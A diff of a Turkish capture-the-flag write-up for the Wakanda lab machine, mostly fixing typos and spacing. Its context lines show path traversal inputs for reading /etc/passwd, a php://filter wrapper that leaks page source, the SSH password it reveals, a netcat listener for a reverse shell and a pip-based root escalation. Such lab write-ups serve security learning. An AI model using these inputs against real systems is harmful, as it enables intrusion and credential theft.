@@ -42,8 +42,11 @@ Yorum satırında bir html link etiketi ile karşılıyoruz ve bu etiketin değe
 URL `http://10.0.2.6/?lang=fr` olarak yazıldığında web sayfasının dili fransızca oluyor. Ancak biz lang parametresini web sayfasına path traversal uygulamak için kullanacağız.
 
 Web sayfası üzerinden sunucudaki bazı dosyaları görüntüleyebilmeyi denemek için,
+
 `http://10.0.2.6/?lang=../../../etc/passwd`
+
 `http://10.0.2.6/?lang=../../etc/passwd`
+
 gibi web adresleri girmeyi deniyorum ancak sonuç alamıyorum. Bunun üzerine hacktricks 'e gidip File Inclusion/Path traversal kategorisi altındaki bazı sonuçlara göz gezdiriyorum ve çalışan bir şey buluyorum.
 
 `http://10.0.2.6/?lang=pHp://FilTer/convert.base64-encode/resource=index` adresine gittiğimde web sayfasında base64 formatındaki bir veri ile karşılaşıyorum.
@@ -55,7 +58,7 @@ Bu base64 stringi kopyalayıp herhangi bir online base64 decoder ile çözdüğ�
 ![](./images/decode_base64.png)
 
 `Potansiyel ssh parolası: Niamey4Ever227!!!`
-`Potansitel ssh kullanıcı adı: mamadou`
+`Potansiyel ssh kullanıcı adı: mamadou`
 
 Web sayfasının alt kısmında `made by mamadou` ifadesinin yer almasından yola çıkarak bunun web sayfasını barındıran sunucuda bulunan bir kullanıcı olabileceğini düşünebiliriz. Başka da bir ipucu görünmüyor.
 
@@ -106,7 +109,7 @@ mamadou@Wakanda1:/home/devops$ cat flag2.txt
 cat: flag2.txt: Permission denied
 ```
 
-Sistemde mamadou kullanıcısı olarak flag2.txt dosyasını okumaya iznimiz yok. Esasen bu dosya üzerinde mamadou kullanıcısı olarak sadece okuma değl yazma, yürütme iznimiz de yok.
+Sistemde mamadou kullanıcısı olarak flag2.txt dosyasını okumaya iznimiz yok. Esasen bu dosya üzerinde mamadou kullanıcısı olarak sadece okuma değil yazma, yürütme iznimiz de yok.
 
 ![](./images/permissions.png)
 
@@ -181,5 +184,6 @@ nc -nvlp 13372
 ![](./images/pip_install.png)
 
 Ardından Wakanda üzerinde root olarak oturum açılıyor ve üçüncü bayrağı da almış oluyoruz.
+
 
 ![](./images/root_flag.png)
